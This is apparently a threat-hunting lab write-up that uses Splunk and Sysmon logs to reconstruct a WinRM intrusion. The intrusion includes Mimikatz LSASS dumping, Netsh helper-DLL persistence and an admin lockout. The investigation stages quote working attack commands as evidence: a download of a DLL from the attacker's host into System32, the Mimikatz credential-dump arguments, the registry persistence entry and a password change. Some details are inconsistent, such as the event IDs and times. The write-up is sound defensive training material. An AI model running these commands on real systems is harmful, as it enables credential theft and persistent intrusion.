# 🔴 Threat Hunting — Full Intrusion Chain Investigation via Splunk

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Threat%20Hunting-purple?style=flat)
![Attack Type](https://img.shields.io/badge/Attack-WinRM%20%7C%20Mimikatz%20%7C%20DLL%20Hijack%20%7C%20Account%20Manipulation-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1021%20%7C%20T1003%20%7C%20T1574%20%7C%20T1546%20%7C%20T1098-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Splunk%20%7C%20Sysmon%20%7C%20Windows%20Security%20Logs-informational?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Hunt Title** | Full Intrusion Chain — WinRM to Account Manipulation |
| **Date** | February 10, 2026 |
| **Affected Host** | ATTACKDEFENSE |
| **Attacker IP** | 10.0.0.56 |
| **Affected User** | Administrator |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ True Positive — Full intrusion chain confirmed |

---

## 🎯 Scenario

A series of security alerts were triggered by a Splunk SIEM deployment indicating a potential intrusion chain. The alerts suggested a complete attack progression — from initial remote access, through credential theft, persistence establishment, and finally account manipulation.

The objective was to use Splunk to correlate logs, validate each alert, and piece together the attacker's full story step by step.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Splunk** | Log correlation and threat hunting queries |
| **Sysmon** | Endpoint telemetry — process, network, file, registry, memory |
| **Windows Security Logs** | Account manipulation events |
| **Windows PowerShell Logs** | Command execution evidence |

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| Sysmon Event ID 1 | Process creation — execution chain |
| Sysmon Event ID 10 | Process access — LSASS memory access |
| Sysmon Event ID 11 | File creation — malicious files dropped |
| Sysmon Event ID 13 | Registry modification — persistence |
| Windows PowerShell Event 800 | Pipeline execution — download commands |
| Windows Security Event 4733 | Group membership removal |

---

## 📚 Resources

| Resource | Link |
|---|---|
| MITRE T1021.006 — WinRM | [attack.mitre.org](https://attack.mitre.org/techniques/T1021/006/) |
| MITRE T1003.001 — LSASS Dumping | [attack.mitre.org](https://attack.mitre.org/techniques/T1003/001/) |
| MITRE T1574.010 — Services File Permissions | [attack.mitre.org](https://attack.mitre.org/techniques/T1574/010/) |
| MITRE T1546.007 — Netsh Helper DLL | [attack.mitre.org](https://attack.mitre.org/techniques/T1546/007/) |
| MITRE T1098 — Account Manipulation | [attack.mitre.org](https://attack.mitre.org/techniques/T1098/) |
| Mimikatz Reference | [github.com/gentilkiwi](https://github.com/gentilkiwi/mimikatz) |

---

## 🔍 Hunt Methodology

```
Stage 1 → Initial Remote Access     (WinRM authentication evidence)
Stage 2 → Tool Staging              (malicious files delivered to disk)
Stage 3 → Credential Theft          (Mimikatz LSASS dump)
Stage 4 → Persistence               (DLL drop + registry key)
Stage 5 → Account Manipulation      (group removal + password change)
```

---

## 📊 Alert Dashboard

> <img width="1355" height="601" alt="m1" src="https://github.com/user-attachments/assets/ebc5080d-0533-4172-8df2-537e80bbab7b" />

The investigation started from a Splunk Enterprise Security dashboard
showing 8 active alerts — 3 critical, 3 high, 2 medium — all on the
same host `ATTACKDEFENSE`, all within a 2-minute window, all originating
from the same source IP `10.0.0.56`.

Reading the dashboard told the story before the hunt even began:

```
11:48  →  WinRM remote login detected
11:48  →  PowerShell downloading suspicious file
11:48  →  LSASS memory accessed
11:48  →  Mimikatz keywords detected
11:49  →  Unsigned DLL written to System32
11:50  →  Registry modification — NetSh key
11:50  →  Admin group members removed
11:50  →  Administrator password changed
```

Eight alerts. Two minutes. One attacker. The hunt was to prove it.

---

## 🕵️ Investigation

### Stage 1 — Initial Remote Access

The first alert flagged a **WinRM login** from `10.0.0.56` to `ATTACKDEFENSE`
using the `Administrator` account. WinRM (Windows Remote Management) is a
legitimate remote management protocol — but when used by an attacker with
stolen or brute-forced credentials, it provides a full interactive PowerShell
session on the target machine indistinguishable from a local admin session.

I hunted **Sysmon Event ID 1** — Process Creation — to confirm the remote
session was active and find its fingerprint in the logs.

> <img width="1073" height="448" alt="m55" src="https://github.com/user-attachments/assets/a24924b9-015b-46ea-9d51-639038d30e83" />

```
Image:           C:\Windows\system32\wsmprovhost.exe
HostName:        ServerRemoteHost
HostApplication: C:\Windows\system32\wsmprovhost.exe -Embedding
User:            ATTACKDEFENSE\Administrator
Source IP:       10.0.0.56
```

The presence of `wsmprovhost.exe` is the definitive WinRM confirmation.

> **🔍 What is wsmprovhost.exe?**
>
> `wsmprovhost.exe` — Windows Remote Management Provider Host — is a
> process that only exists when someone connects to a machine via WinRM
> remotely. It hosts the PowerShell session on the target on behalf of
> the remote caller. You will never see this process from local activity.
>
> ```
> wsmprovhost.exe present = someone is connected remotely via WinRM
> No exceptions.
> ```
>
> Combined with `HostName = ServerRemoteHost` and the source IP `10.0.0.56`,
> the remote session origin is confirmed beyond doubt. Everything the
> attacker did from this point was executed through this single remote
> connection.

---

### Stage 2 — Tool Staging: Getting the Weapons on Disk

With a remote shell established, the attacker's next move was to get
their tools onto the target machine. I hunted **Sysmon Event ID 11** —
File Created — to see every file written through the WinRM session.

Two files appeared within 90 seconds of each other — both created by
the same process, the same ProcessId (4444), the same WinRM session.

#### File 1 — gotyou.exe

> <img width="1068" height="526" alt="m20" src="https://github.com/user-attachments/assets/d69cc77b-d1d8-4bc7-b917-6f8bae4cb3bc" />


```
Time:         2026-02-10 11:48:38.830
EventCode:    11 — File Created
Image:        C:\Windows\system32\wsmprovhost.exe
TargetFile:   C:\Windows\Temp\gotyou.exe
ProcessId:    4444
User:         ATTACKDEFENSE\Administrator
```

A file named `gotyou.exe` dropped into `C:\Windows\Temp\` by the WinRM
session process. The name is suspicious. The location is a classic staging
spot — writable by all users, frequently excluded from AV scanning. Fourteen
seconds later, it would be executed against LSASS.

#### File 2 — evil_netsh.dll

> <img width="1063" height="511" alt="m4" src="https://github.com/user-attachments/assets/3cc85e56-78c2-4032-9b8b-222852095cbe" />


```
Time:         2026-02-10 11:49:52.363
EventCode:    11 — File Created
MITRE:        T1574.010 — Services File Permissions Weakness
Image:        C:\Windows\system32\wsmprovhost.exe
TargetFile:   C:\Windows\System32\evil_netsh.dll
ProcessId:    4444
User:         ATTACKDEFENSE\Administrator
```

The **same process, same session** dropped a DLL directly into System32 —
a protected system directory. Writing an unsigned DLL to System32 is not
something legitimate remote sessions do.

The PowerShell log (Event 800) confirmed exactly how it arrived:

> <img width="1016" height="374" alt="m22" src="https://github.com/user-attachments/assets/2b45560a-c1cd-4fda-8d3a-d6e112339b45" />

```powershell
Invoke-WebRequest -Uri http://10.0.0.56:8080/evil_netsh.dll
                  -OutFile C:\Windows\System32\evil_netsh.dll
```

The attacker hosted the DLL on a Python HTTP server (port 8080) on their
own machine — the same IP as the WinRM source — and pulled it down through
the remote PowerShell session using `Invoke-WebRequest`.

---
### Stage 3 — Credential Theft: Mimikatz Against LSASS

Fourteen seconds after dropping `gotyou.exe`, the attacker executed it.
I hunted **Sysmon Event ID 1** to capture the process creation.

> <img width="1358" height="411" alt="m16" src="https://github.com/user-attachments/assets/6d357940-b417-4c65-901f-98fb2733acda" />



```
Time:             2026-02-10 11:48:52
EventCode:        1 — Process Created
OriginalFileName: mimikatz.exe
Image:            C:\Windows\Temp\gotyou.exe
ParentImage:      C:\Windows\System32\wsmprovhost.exe
CommandLine:      "C:\Windows\Temp\gotyou.exe"
                  privilege::debug sekurlsa::logonpasswords exit
Company:          gentilkiwi (Benjamin DELPY)
Description:      mimikatz for Windows
CurrentDirectory: C:\Windows\Temp\
```

`gotyou.exe` is Mimikatz — renamed to evade tools that look for
`mimikatz.exe` by filename. The rename failed because Sysmon captures
the `OriginalFileName` field directly from the PE header — a value
embedded at compile time that cannot be changed by renaming the file.
The true identity of any binary is always in the PE header, not the filename.

> **🔍 What did the attacker run?**
>
> ```
> privilege::debug          → requests debug privilege
>                             required to open a handle to LSASS memory
>
> sekurlsa::logonpasswords  → reads all credentials from LSASS memory
>                             dumps NTLM hashes
>                             dumps plaintext passwords where available
>                             dumps Kerberos tickets
>                             dumps all logged-in user credentials
>
> exit                      → close Mimikatz after dumping
> ```

> **🔍 What is LSASS and why is it the target?**
>
> LSASS (Local Security Authority Subsystem Service) is the Windows
> process responsible for handling logins and keeping credentials in
> memory for active sessions. Every user logged into the machine has
> their credentials cached here.
>
> Think of LSASS as a vault. `wininit.exe` is the legitimate owner:
> ```
> wininit.exe → spawns lsass.exe at boot (legitimate)
> ```
> Mimikatz is the thief — it does not break the vault or kill the process.
> It picks the lock, reads everything inside, and walks away. LSASS keeps
> running normally. The theft is invisible without proper monitoring.

To confirm exactly how Mimikatz accessed LSASS memory, I hunted
**Sysmon Event ID 10** — Process Access:

> <img width="1064" height="522" alt="66" src="https://github.com/user-attachments/assets/4e2f7b03-0136-4579-8454-bcf7353655b5" />

```
Time:          2026-02-10 11:48:52
SourceImage:   C:\Windows\Temp\gotyou.exe
TargetImage:   C:\Windows\system32\lsass.exe
GrantedAccess: 0x1010
CallTrace:     ntdll.dll → KERNELBASE.dll → gotyou.exe →
               gotyou.exe → gotyou.exe → KERNEL32.DLL → ntdll.dll
```

`GrantedAccess: 0x1010` is the combination of two permission flags:

| Flag | Value | Meaning |
|---|---|---|
| `PROCESS_QUERY_LIMITED_INFORMATION` | `0x1000` | Query basic process information |
| `PROCESS_VM_READ` | `0x0010` | Read process memory |
| **Combined** | **0x1010** | **Read LSASS memory + query info** |

This is the **minimum permission needed to dump credentials** — and
Mimikatz requests exactly this amount deliberately. Requesting more
would be more suspicious and more likely to be blocked by EDR tools.

The `CallTrace` told the rest of the story — `gotyou.exe` appearing
multiple times means Mimikatz made multiple sequential memory reads
into LSASS — extracting NTLM hashes, plaintext passwords, and Kerberos
tickets in separate calls.

A legitimate LSASS access looks like:
```
ntdll.dll → wininit.exe → system DLLs   (all Microsoft signed)
```

The malicious access looked like:
```
ntdll.dll → KERNELBASE.dll → gotyou.exe → gotyou.exe → gotyou.exe
```

A temp folder executable making repeated calls to LSASS is not normal.

#### The Credential Dump Output File

I searched **Sysmon Event ID 11** for any files created by `lsass.exe`
after the Mimikatz execution. Three files appeared — but only one was
suspicious:

> <img width="1076" height="502" alt="m11" src="https://github.com/user-attachments/assets/ee72358b-6c19-4758-befc-b086f91d911d" />

```
Time:           2026-02-10 11:53:00
EventCode:      11 — File Created
Image:          C:\Windows\system32\lsass.exe
TargetFilename: C:\Windows\debug\PASSWD.LOG
CreationTime:   2018-11-15 00:04:09.958
```

The credentials were saved to `C:\Windows\debug\PASSWD.LOG`.

The other two files that appeared at the same timestamp were legitimate:

| File | Location | Verdict | Reason |
|---|---|---|---|
| `SAM.etl` | `System32\LogFiles\SAM\` | ✅ Legitimate | Standard Windows ETL trace file |
| `LSA.etl` | `System32\LogFiles\LSA\` | ✅ Legitimate | Standard Windows ETL trace file |
| `PASSWD.LOG` | `Windows\debug\` | 🚨 Malicious | Not a Windows file — wrong location |

**The analyst astuce for separating noise from signal:**
```
4 questions to determine legitimacy:
1. Is this a known Windows file?        SAM.etl → Yes  | PASSWD.LOG → No
2. Is it in the expected location?      SAM.etl → Yes  | PASSWD.LOG → No
3. Does the timestamp make sense?       SAM.etl → Yes  | PASSWD.LOG → No
4. Was it created during attack window? SAM.etl → Maybe| PASSWD.LOG → Yes
```

When all four answers point suspicious — it is malicious.

The attacker also used **timestomping** on PASSWD.LOG — deliberately
backdating the file's creation timestamp to make it appear old:

```
Sysmon event time:  2026-02-10 11:53:00  ← when it was actually created
File timestamp:     2018-11-15 00:04:09  ← what the file claims
Gap:                8 years
```

The 8-year discrepancy is the giveaway. Always cross-reference the
Sysmon event timestamp against the file's `CreationTime` field — they
should match. When they do not — timestomping.

---
### Stage 4 — Persistence: Netsh Helper DLL

With credentials stolen, the attacker established persistence to ensure
continued access even if the WinRM session dropped or defenders reset
the Administrator password.

**Sysmon Event ID 13** — Registry Value Set — captured the persistence
mechanism being written:

> <img width="1081" height="547" alt="m3" src="https://github.com/user-attachments/assets/b75b916c-8f8e-44b8-b3c5-3e3ef28080c4" />


```
Time:         2026-02-10 11:50:03.878
EventCode:    13 — Registry Value Set
MITRE:        T1546.007 — Netsh Helper DLL
Image:        C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\NetSh\evil_helper
Details:      C:\Windows\System32\evil_netsh.dll
User:         ATTACKDEFENSE\Administrator
```

The PowerShell log confirmed the exact command that ran:

> <img width="1065" height="472" alt="m7" src="https://github.com/user-attachments/assets/f7c05cae-6835-4855-b88b-360bf67aaa42" />

```powershell
reg add "HKLM\SOFTWARE\Microsoft\NetSh"
        /v evil_helper
        /t REG_SZ
        /d "C:\Windows\System32\evil_netsh.dll"
        /f

Result: "The operation completed successfully."
```

> **🔍 Why Netsh Helper DLL is a stealthy persistence technique:**
>
> Windows maintains a list of helper DLLs under:
> ```
> HKLM\SOFTWARE\Microsoft\NetSh
> ```
> Every time `netsh.exe` (Network Shell) runs — which happens regularly
> for network configuration — Windows automatically loads every DLL
> registered under this key. No user interaction. No startup entry.
> No scheduled task. Just a registry key that most defenders never watch.
>
> ```
> Any process runs netsh.exe
>     ↓
> Windows loads all registered helpers
>     ↓
> evil_netsh.dll executes automatically
>     ↓
> Attacker code runs — silently, repeatedly
> ```
>
> This is why **T1546.007** is one of the most undermonitored persistence
> techniques. Registry Run keys get all the attention. Netsh helpers
> get none.

Three independent log sources confirmed the same persistence action:
```
Sysmon EID 13    → reg.exe wrote to HKLM\SOFTWARE\Microsoft\NetSh
PowerShell EID   → reg add command ran successfully
Sysmon EID 11    → evil_netsh.dll exists on disk in System32
```

---
### Stage 5 — Account Manipulation: Locking Everyone Else Out

The final stage was the most destructive. With persistence secured,
the attacker turned to **account manipulation** — ensuring they had
exclusive access while locking out every legitimate administrator.

#### Four Admin Accounts Stripped of Privileges

I hunted **Windows Security Event ID 4726** — a member was removed
from a security-enabled local group:

> <img width="1365" height="407" alt="m14" src="https://github.com/user-attachments/assets/8fec9312-2d4a-44c9-8d84-b0bbec0a2a5d" />

```
11:50:34  →  sysadmin   removed from local admin group
11:50:38  →  netadmin   removed from local admin group
11:50:44  →  itadmin    removed from local admin group
11:50:49  →  servadmin  removed from local admin group
```

Four legitimate admin accounts stripped of their group membership in
**15 seconds**. This is not accidental. This is systematic.

> **🔍 What is Event ID 4726?**
>
> EID 4726 is logged when a local user account is permanently deleted.
> It captures which account was deleted and who performed the action.
> Seeing four admin accounts deleted in 15 seconds by the same subject
> account is a definitive indicator of deliberate sabotage —
> not routine administration..

**Why the attacker did this:**
```
→ Lock out all legitimate administrators
→ Prevent the security team from responding through normal channels
→ Ensure only the attacker retains privileged access
→ Buy time before defenders can act
```

#### Administrator Password Changed

> <img width="1061" height="465" alt="m13" src="https://github.com/user-attachments/assets/49421226-341e-4d6c-b30b-1f5e99f63344" />

```
OriginalFileName:    net1.exe
ParentCommandLine:   "C:\Windows\system32\net.exe" user administrator lmao1221
CommandLine:         C:\Windows\system32\net1 user administrator lmao1221
CurrentDirectory:    C:\Windows\Temp\
Host:                ATTACKDEFENSE
```

The attacker changed the Administrator account password to `lmao1221`.

Even if defenders discovered the intrusion and attempted to use the
Administrator account to respond — they could not. Combined with the
four admin accounts stripped of group membership, the attacker effectively
owned the machine and locked out everyone else simultaneously.

And even if the password was eventually reset — `evil_netsh.dll` would
continue executing every time `netsh.exe` ran, maintaining a persistent
foothold independent of any account credential.

---

## ⏱️ Complete Attack Timeline

```
Feb 10, 2026

11:48:38  →  gotyou.exe (Mimikatz) dropped to C:\Windows\Temp\
              via wsmprovhost.exe — WinRM session from 10.0.0.56

11:48:52  →  gotyou.exe executed against LSASS
              privilege::debug + sekurlsa::logonpasswords exit
              GrantedAccess: 0x1010 — LSASS memory read
              All cached credentials dumped

11:49:52  →  evil_netsh.dll downloaded via PowerShell
              Invoke-WebRequest from http://10.0.0.56:8080
              Written to C:\Windows\System32\

11:50:03  →  reg.exe created NetSh registry key
              HKLM\SOFTWARE\Microsoft\NetSh\evil_helper
              Persistence fully established

11:50:34  →  sysadmin removed from admin group
11:50:38  →  netadmin removed from admin group
11:50:44  →  itadmin removed from admin group
11:50:49  →  servadmin removed from admin group
              All legitimate administrators locked out

11:53:00  →  PASSWD.LOG created in C:\Windows\debug\
              Timestomped to 2018-11-15 to evade detection
              Full credential dump saved to disk

11:53:00  →  Administrator password changed to lmao1221
              Attacker owns the account
              Defenders locked out
```

---

## 🧩 IOCs — Indicators of Compromise

| Type | Value |
|---|---|
| **Attacker IP** | 10.0.0.56 |
| **Attacker Staging Port** | 8080 |
| **Affected Host** | ATTACKDEFENSE |
| **Mimikatz (renamed)** | C:\Windows\Temp\gotyou.exe |
| **Persistence DLL** | C:\Windows\System32\evil_netsh.dll |
| **Credential Dump File** | C:\Windows\debug\PASSWD.LOG |
| **Registry Key** | HKLM\SOFTWARE\Microsoft\NetSh\evil_helper |
| **New Admin Password** | lmao1221 |
| **GrantedAccess on LSASS** | 0x1010 |
| **Removed Accounts** | sysadmin, netadmin, itadmin, servadmin |
| **WinRM Process** | wsmprovhost.exe — ProcessId 4444 |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Remote Services: WinRM | T1021.006 | wsmprovhost.exe confirmed remote session |
| Execution | PowerShell | T1059.001 | Invoke-WebRequest via WinRM |
| Credential Access | LSASS Memory Dump | T1003.001 | gotyou.exe — Mimikatz — GrantedAccess 0x1010 |
| Defense Evasion | Masquerading | T1036 | mimikatz.exe renamed to gotyou.exe |
| Defense Evasion | Timestomp | T1070.006 | PASSWD.LOG backdated to 2018 |
| Persistence | Netsh Helper DLL | T1546.007 | evil_helper → evil_netsh.dll |
| Persistence | Services File Permissions Weakness | T1574.010 | Unsigned DLL written to System32 |
| Impact | Account Manipulation | T1098 | Administrator password changed |
| Impact | Account Access Removal | T1531 | 4 admin accounts removed from groups |

---

## 💡 Key Lessons Learned

**1 — wsmprovhost.exe Is the WinRM Fingerprint**
Any malicious activity with `wsmprovhost.exe` as the parent process came
through a WinRM remote session. This single field ties every attacker
action back to the initial remote access — making attribution clean and
unambiguous across the entire kill chain.

**2 — OriginalFileName Catches Renamed Malware**
Renaming `mimikatz.exe` to `gotyou.exe` failed because Sysmon captures
`OriginalFileName` from the PE header. Always check this field — it
reveals the true identity of any binary regardless of what it was renamed to.

**3 — 0x1010 Is Mimikatz's Calling Card**
`GrantedAccess: 0x1010` on an LSASS access event from a non-system
process is a reliable Mimikatz indicator. It is the minimum permission
needed for credential dumping and Mimikatz requests exactly this amount
deliberately to stay under EDR thresholds.

**4 — Timestomping Is Easy To Detect**
Compare the Sysmon event timestamp with the file's `CreationTime`. An
8-year discrepancy between when Sysmon recorded the file and what the
file claims is an immediate red flag. Always cross-reference both.

**5 — NetSh DLL Persistence Is Undermonitored**
Most persistence detection focuses on `CurrentVersion\Run`. Netsh helper
DLLs are legitimate Windows functionality that most teams never monitor.
Any write to `HKLM\SOFTWARE\Microsoft\NetSh` by a non-system process
should be treated as critical.

**6 — Legitimate Files Appear Alongside Malicious Ones**
SAM.etl and LSA.etl appeared at the exact same time as PASSWD.LOG —
all created by lsass.exe. The 4-question legitimacy check quickly
separated Windows noise from attacker activity. Do not dismiss files
just because a legitimate process created them — context is everything.

---

## 🔧 Remediation & Recovery

| Priority | Action |
|---|---|
| 🔴 Critical | Isolate ATTACKDEFENSE immediately |
| 🔴 Critical | Reset Administrator password — attacker set it to lmao1221 |
| 🔴 Critical | Delete evil_netsh.dll from System32 |
| 🔴 Critical | Remove HKLM\SOFTWARE\Microsoft\NetSh\evil_helper registry key |
| 🔴 Critical | Delete C:\Windows\debug\PASSWD.LOG — contains all dumped credentials |
| 🔴 Critical | Restore sysadmin, netadmin, itadmin, servadmin to their admin groups |
| 🔴 Critical | Reset all account credentials on ATTACKDEFENSE — all were dumped |
| 🟠 High | Block 10.0.0.56 at perimeter firewall |
| 🟠 High | Delete gotyou.exe from C:\Windows\Temp\ |
| 🟠 High | Audit all local accounts for unauthorized changes |
| 🟠 High | Restrict WinRM access to approved management IPs only |
| 🟡 Medium | Hunt for evil_netsh.dll and gotyou.exe across all endpoints |
| 🟡 Medium | Add detection rule: GrantedAccess 0x1010 on lsass.exe from non-system processes |
| 🟡 Medium | Monitor HKLM\SOFTWARE\Microsoft\NetSh for unauthorized writes |
| 🟢 Low | Investigate how attacker initially obtained Administrator credentials |

---

## ✅ Conclusion

```
Verdict:   TRUE POSITIVE ✅
Attacker:  10.0.0.56
Host:      ATTACKDEFENSE
Duration:  ~5 minutes (11:48:38 → 11:53:00)
Impact:    Full compromise — credentials dumped, persistence established,
           all admins locked out, Administrator password changed
```

Eight alerts on a dashboard. Five minutes of attacker activity. A complete
intrusion chain from the first WinRM packet to full domain administrator
control — all reconstructed from raw log evidence without a single
assumption that was not backed by a specific artifact.

The attacker used legitimate Windows tools and protocols at every stage —
WinRM for access, PowerShell for delivery, a renamed binary for credential
theft, a legitimate registry mechanism for persistence. Nothing exotic.
Everything documented.

> *Five minutes.*
> *Remote shell. Credential dump. Persistence. Lockout.*
> *The only thing that stopped it was the logs.*

---

## 📚 References

| Resource | Link |
|---|---|
| MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
| Sysmon Reference | [docs.microsoft.com](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |
| Mimikatz | [github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) |
| Splunk Documentation | [docs.splunk.com](https://docs.splunk.com) |

---

